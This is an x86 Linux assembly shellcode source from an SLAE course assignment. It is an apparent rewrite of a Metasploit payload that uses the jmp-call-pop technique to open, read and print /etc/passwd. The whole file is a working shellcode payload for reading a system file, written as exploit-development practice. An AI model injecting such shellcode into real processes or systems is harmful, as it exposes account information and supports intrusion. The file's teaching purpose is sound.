; Author: John Stigerwalt
; SLAE: Assignment #5
; Website: slae.whiteknightlabs.com
; Shellcode: Read-File "/etc/passwd"
; Metasploit Re-Write of Read-File x86 linux shellocode string paramter = /etc/passwd
; Shellcode using jmp-call-pop method

global _start

section .text

_start:


jmp short push_str

last:
    mov eax, 0x5                ; 0x5 = open()
    pop ebx
    xor ecx, ecx                ; zero out ecx, 2nd arg = 0
    int 0x80  
    
    mov ebx, eax
    mov eax, 0x3
    mov edi, esp
    mov ecx, edi
    mov edx, 0x1000
    int 0x80

    mov edx, eax
    mov eax, 0x4
    mov ebx, 0x1
    int 0x80

    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

push_str:
    call last
    str: db "/etc/passwd"
